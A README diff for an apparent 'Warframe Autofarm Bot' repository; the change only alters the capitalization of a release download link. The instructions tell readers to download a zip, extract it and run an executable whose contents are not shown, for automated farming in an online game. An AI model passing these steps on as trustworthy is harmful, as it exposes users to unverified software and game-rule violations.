@@ -13,7 +13,7 @@ Welcome to the Warframe Autofarm Bot repository! This application is designed to
 ## 🚀 How to Use? Instruction
 
 ![image](https://github.com/user-attachments/assets/99059080-9c4b-4135-911a-28b856e5eca4)
-1. Download the latest version of the Warframe autofarm or [click](https://github.com/LeyvanDoyvski/Warframe-autofarm/releases/download/Release/warframe.autofarm.zip).
+1. Download the latest version of the Warframe autofarm or [click](https://github.com/LeyvanDoyvski/Warframe-autofarm/releases/download/Release/Warframe.autofarm.zip).
 2. Extract the contents.
 3. Open the file in extract folder `Warframe autofarm.exe`.
 4. Wait for the installation to complete.
